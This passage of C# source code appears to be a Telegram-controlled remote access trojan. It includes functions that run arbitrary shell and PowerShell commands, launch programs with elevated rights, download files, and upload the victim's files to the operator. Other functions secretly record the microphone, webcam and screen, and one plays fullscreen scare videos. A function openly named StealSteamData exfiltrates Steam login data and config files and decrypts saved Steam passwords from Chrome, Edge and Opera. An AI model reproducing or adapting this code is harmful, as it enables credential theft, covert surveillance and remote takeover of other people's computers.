            {
                FileName = filename,
                Arguments = arguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process process = new Process { StartInfo = psi };
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            return string.IsNullOrEmpty(error) ? output : $"ERROR:\n{error}";
        }
        catch (Exception ex)
        {
            return $"Exception: {ex.Message}";
        }
    }

    private static string ExecutePowerShell(string script)
    {
        try
        {
            using (var ps = System.Management.Automation.PowerShell.Create())
            {
                ps.AddScript(script);
                var results = ps.Invoke();
                string output = string.Join("\n", results.Select(r => r?.ToString() ?? ""));
                string errors = string.Join("\n", ps.Streams.Error.ReadAll().Select(e => e.ToString()));

                return string.IsNullOrEmpty(errors) ? output : $"ERROR:\n{errors}";
            }
        }
        catch (Exception ex)
        {
            return $"Exception: {ex.Message}";
        }
    }

    private static string RunExe(string path, string args, bool runAsAdmin)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = path,
                Arguments = args,
                RedirectStandardOutput = !runAsAdmin,
                RedirectStandardError = !runAsAdmin,
                UseShellExecute = runAsAdmin,
                CreateNoWindow = true,
                Verb = runAsAdmin ? "runas" : ""
            };

            Process process = new Process { StartInfo = psi };
            process.Start();

            if (!runAsAdmin)
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                return string.IsNullOrEmpty(error) ? output : $"ERROR:\n{error}";
            }
            else
            {
                return $"EXE started with admin rights (UAC).";
            }
        }
        catch (Exception ex)
        {
            return $"Exception: {ex.Message}";
        }
    }

    private static string DownloadFile(string url)
    {
        try
        {
            string tempDir = Path.GetTempPath();
            string fileName = Path.GetFileName(url.Split('?')[0]);
            string filePath = Path.Combine(tempDir, fileName);

            using (var client = new System.Net.WebClient())
            {
                client.DownloadFile(url, filePath);
            }
            return $"✅ File saved: `{filePath}`";
        }
        catch (Exception ex)
        {
            return $"❌ Error: {ex.Message}";
        }
    }

    private static async Task<string> HandleFileUpload(Telegram.Bot.Types.Document document)
    {
        try
        {
            string tempDir = Path.GetTempPath();
            string filePath = Path.Combine(tempDir, document.FileName);

            var file = await botClient.GetFileAsync(document.FileId);
            using (var fs = new FileStream(filePath, FileMode.Create))
            {
                await botClient.DownloadFileAsync(file.FilePath, fs);
            }
            return $"✅ File saved: `{filePath}`";
        }
        catch (Exception ex)
        {
            return $"❌ Error: {ex.Message}";
        }
    }

    private static async Task DownloadAndSendFiles(long chatId, string filePath)
    {
        try
        {
            if (System.IO.File.Exists(filePath))
            {
                using (var stream = System.IO.File.OpenRead(filePath))
                {
                    await botClient.SendDocumentAsync(
                        chatId: chatId,
                        document: new InputOnlineFile(stream, Path.GetFileName(filePath)),
                        caption: $"📄 File: {filePath}"
                    );
                }
            }
            else
            {
                await SendSafeTextMessage(chatId, $"❌ File not found: {filePath}");
            }
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ File send error: {ex.Message}");
        }
    }

    private static async Task HandleScareVideo(long chatId, Document document, int durationSeconds)
    {
        string tempFile = null;
        try
        {
            // Создаем временный файл с правильным расширением
            tempFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + Path.GetExtension(document.FileName));

            // Скачиваем файл
            var file = await botClient.GetFileAsync(document.FileId);
            using (var fs = new FileStream(tempFile, FileMode.Create))
            {
                await botClient.DownloadFileAsync(file.FilePath, fs);
            }

            // Воспроизводим видео
            await PlayFullscreenVideo(tempFile, durationSeconds);

            await SendSafeTextMessage(chatId, $"👻 Scare screen activated for {durationSeconds} seconds ({currentPcId})");
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Error with scare video: {ex.Message}");
        }
        finally
        {
            // Удаляем временный файл, если он был создан
            if (tempFile != null && System.IO.File.Exists(tempFile))
            {
                try { System.IO.File.Delete(tempFile); } catch { /* Игнорируем ошибки удаления */ }
            }
        }
    }

    private static async Task HandleAudioRecordCommand(ITelegramBotClient botClient, long chatId, int seconds)
    {
        try
        {
            if (seconds <= 0 || seconds > 300)
            {
                await SendSafeTextMessage(chatId, "❌ Recording time must be between 1 and 300 seconds");
                return;
            }

            await SendSafeTextMessage(chatId, $"🎤 Starting audio recording for {seconds} seconds...");

            string tempFile = Path.GetTempFileName() + ".wav";

            using (var waveIn = new WaveInEvent())
            using (var writer = new WaveFileWriter(tempFile, waveIn.WaveFormat))
            {
                waveIn.StartRecording();

                // Обработчик для записи данных
                waveIn.DataAvailable += (s, e) =>
                {
                    writer.Write(e.Buffer, 0, e.BytesRecorded);
                };

                // Ждем указанное время
                await Task.Delay(seconds * 1000);

                waveIn.StopRecording();
            }

            // Отправляем записанное аудио
            using (var stream = System.IO.File.OpenRead(tempFile))
            {
                await botClient.SendAudioAsync(
                    chatId: chatId,
                    audio: new InputOnlineFile(stream, "recording.wav"),
                    caption: $"🎤 Audio recording ({currentPcId}, {seconds} sec)"
                );
            }

            System.IO.File.Delete(tempFile);
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Audio recording error: {ex.Message}");
        }
    }

    private static async Task PlayFullscreenVideo(string videoPath, int durationSeconds)
    {
        await Task.Run(() =>
        {
            Form form = null;
            WindowsMediaPlayer player = null;
            System.Windows.Forms.Timer timer = null;

            try
            {
                form = new Form
                {
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    ControlBox = false
                };

                player = new WindowsMediaPlayer
                {
                    settings = { autoStart = true },
                    uiMode = "none",
                    stretchToFit = true,
                    URL = videoPath
                };

                // Обработчик изменения состояния воспроизведения
                player.PlayStateChange += (int state) =>
                {
                    if (state == (int)WMPPlayState.wmppsStopped)
                    {
                        form.Invoke(new Action(() => form.Close()));
                    }
                };

                // Таймер для автоматического закрытия
                timer = new System.Windows.Forms.Timer
                {
                    Interval = durationSeconds * 1000
                };
                timer.Tick += (s, e) =>
                {
                    timer.Stop();
                    player.controls.stop();
                    form.Invoke(new Action(() => form.Close()));
                };
                timer.Start();

                Application.Run(form);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error playing video: {ex.Message}");
                form?.Close();
            }
            finally
            {
                timer?.Dispose();
                player?.controls.stop();
            }
        });
    }

    private static async Task HandleWebcamCommand(ITelegramBotClient botClient, long chatId, int seconds)
    {
        try
        {
            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (videoDevices.Count == 0)
            {
                await SendSafeTextMessage(chatId, "❌ Webcam not found");
                return;
            }

            var videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
            string tempFile = Path.GetTempFileName() + ".avi";

            using (var videoWriter = new VideoFileWriter())
            {
                videoWriter.Open(tempFile, 640, 480, 25, VideoCodec.MPEG4);

                videoSource.NewFrame += (sender, eventArgs) =>
                {
                    videoWriter.WriteVideoFrame(eventArgs.Frame);
                };

                videoSource.Start();
                await Task.Delay(seconds * 1000);
                videoSource.SignalToStop();
                videoSource.WaitForStop();
                videoWriter.Close();
            }

            using (var stream = System.IO.File.OpenRead(tempFile))
            {
                await botClient.SendVideoAsync(
                    chatId: chatId,
                    video: new InputOnlineFile(stream, "webcam.mp4"),
                    caption: $"📷 Webcam recording ({currentPcId}, {seconds} sec)"
                );
            }

            System.IO.File.Delete(tempFile);
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Webcam error: {ex.Message}");
        }
    }

    private static async Task<string> StealSteamData()
    {
        try
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== 🎮 Steam Data ===");

            string steamPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                "Steam");

            if (Directory.Exists(steamPath))
            {
                // 1. Крадем логины из файла конфигурации
                string configPath = Path.Combine(steamPath, "config", "loginusers.vdf");
                if (System.IO.File.Exists(configPath))
                {
                    try
                    {
                        sb.AppendLine("\n=== 🔑 Steam Logins ===");
                        string configContent = System.IO.File.ReadAllText(configPath);

                        // Парсим VDF файл (упрощенная версия)
                        var loginMatches = Regex.Matches(configContent,
                            "\"AccountName\"\\s+\"([^\"]+)\".*?\"RememberPassword\"\\s+\"([^\"]+)\".*?\"WantsOfflineMode\"\\s+\"([^\"]+)\"",
                            RegexOptions.Singleline);

                        foreach (Match match in loginMatches)
                        {
                            if (match.Groups.Count >= 4)
                            {
                                string username = match.Groups[1].Value;
                                string rememberPassword = match.Groups[2].Value;
                                string offlineMode = match.Groups[3].Value;

                                sb.AppendLine($"👤 Username: {username}");
                                sb.AppendLine($"🔑 Remember Password: {rememberPassword}");
                                sb.AppendLine($"💻 Offline Mode: {offlineMode}");
                                sb.AppendLine();
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine($"❌ Error reading login data: {ex.Message}");
                    }
                }

                // 2. Крадем файлы кэша Steam
                string ssfnFiles = string.Join(", ",
                    Directory.GetFiles(steamPath, "ssfn*").Select(Path.GetFileName));
                if (!string.IsNullOrEmpty(ssfnFiles))
                {
                    sb.AppendLine("\n=== 🔐 Steam SSFN Files ===");
                    sb.AppendLine(ssfnFiles);
                }

                // 3. Крадем конфигурацию Steam
                string configDir = Path.Combine(steamPath, "config");
                if (Directory.Exists(configDir))
                {
                    try
                    {
                        string tempZip = Path.GetTempFileName() + ".zip";
                        System.IO.Compression.ZipFile.CreateFromDirectory(configDir, tempZip);

                        using (var stream = System.IO.File.OpenRead(tempZip))
                        {
                            await botClient.SendDocumentAsync(
                                chatId: adminChatId, document: new InputOnlineFile(stream, "steam_config.zip"),
                            caption: $"🎮 Steam config files from {currentPcId}"
                        );
                        }

                        System.IO.File.Delete(tempZip);
                        sb.AppendLine("\n✅ Steam config files uploaded");
                    }
                    catch (Exception ex)
                    {
                        sb.AppendLine($"❌ Error stealing config files: {ex.Message}");
                    }
                }

                // 4. Крадем сохраненные пароли из браузеров (для Steam Web)
                sb.AppendLine("\n=== 🌐 Browser Steam Logins ===");
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string[] browsers = { "Google\\Chrome", "Microsoft\\Edge", "Opera Software\\Opera Stable" };

                foreach (string browser in browsers)
                {
                    string loginDataPath = Path.Combine(appData, browser, "User Data", "Default", "Login Data");
                    if (System.IO.File.Exists(loginDataPath))
                    {
                        try
                        {
                            string tempFile = Path.GetTempFileName();
                            System.IO.File.Copy(loginDataPath, tempFile, true);

                            using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                            {
                                conn.Open();
                                using (var cmd = conn.CreateCommand())
                                {
                                    cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%steam%'";
                                    using (var reader = cmd.ExecuteReader())
                                    {
                                        while (reader.Read())
                                        {
                                            string url = reader.GetString(0);
                                            string username = reader.GetString(1);
                                            byte[] encryptedPassword = (byte[])reader[2];

                                            if (encryptedPassword.Length > 0)
                                            {
                                                string password = Encoding.UTF8.GetString(
                                                    ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser));

                                                sb.AppendLine($"🌐 {url}");
                                                sb.AppendLine($"👤 {username}");
                                                sb.AppendLine($"🔑 {password}");
                                                sb.AppendLine();
                                            }
                                        }
                                    }
                                }
                            }
                            System.IO.File.Delete(tempFile);
                        }
                        catch { }
                    }
                }

                // 5. Крадем локальные файлы Steam
                string userDataPath = Path.Combine(steamPath, "userdata");
                if (Directory.Exists(userDataPath))
                {
                    try
                    {
                        string[] userDirs = Directory.GetDirectories(userDataPath);
                        sb.AppendLine("\n=== 👥 Steam User Folders ===");
                        sb.AppendLine($"Found {userDirs.Length} user folders");

                        // Можно добавить загрузку этих файлов, но они могут быть большими
                        // Вместо этого просто сообщим о их наличии
                    }
                    catch { }
                }
            }
            else
            {
                sb.AppendLine("❌ Steam not found on this computer");
            }

            return sb.ToString();
        }
        catch (Exception ex)
        {
            return $"❌ Error stealing Steam data: {ex.Message}";
        }
    }

    private static async Task<string> SetWallpaperFromDocuments(Document document)
    {
        try
        {
            string tempFile = Path.GetTempFileName() + Path.GetExtension(document.FileName);
            var file = await botClient.GetFileAsync(document.FileId);
            using (var fs = new FileStream(tempFile, FileMode.Create))
            {
                await botClient.DownloadFileAsync(file.FilePath, fs);
            }

            SystemParametersInfo(20, 0, tempFile, 0x01 | 0x02);
            return "✅ Wallpaper changed successfully";
        }
        catch (Exception ex)
        {
            return $"❌ Error changing wallpaper: {ex.Message}";
        }
    }

    private static async Task HandleScreenRecordCommand(ITelegramBotClient botClient, long chatId, int seconds)
    {
        try
        {
            string tempFile = Path.GetTempFileName() + ".avi";
            var videoWriter = new VideoFileWriter();
            videoWriter.Open(tempFile, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, 10, VideoCodec.MPEG4);

            var stopTime = DateTime.Now.AddSeconds(seconds);

            while (DateTime.Now < stopTime)
            {
                using (var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(
                        new Point(0, 0),
                        new Point(0, 0),
                        new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                    );
                    videoWriter.WriteVideoFrame(bmp);
                }
                await Task.Delay(100);
            }

            videoWriter.Close();

            using (var stream = System.IO.File.OpenRead(tempFile))
            {
                await botClient.SendVideoAsync(
                    chatId: chatId,
                    video: new InputOnlineFile(stream, "screen.mp4"),
                    caption: $"🎥 Screen recording ({currentPcId}, {seconds} sec)"
                );
            }

            System.IO.File.Delete(tempFile);
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Screen record error: {ex.Message}");
        }
    }

    private static async Task HandleScreenshotCommand(ITelegramBotClient botClient, long chatId)
    {
        try
        {
            using (var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(
                    new Point(0, 0),
                    new Point(0, 0),
                    new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                );

                string tempFile = Path.GetTempFileName() + ".jpg";
                bmp.Save(tempFile, ImageFormat.Jpeg);

                using (var stream = System.IO.File.OpenRead(tempFile))
                {
                    await botClient.SendPhotoAsync(
                        chatId: chatId,
                        photo: new InputOnlineFile(stream, "screenshot.jpg"),
                        caption: $"📸 Screenshot from {currentPcId}"
                    );
                }

                System.IO.File.Delete(tempFile);
            }
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Screenshot error: {ex.Message}");
        }
    }
}
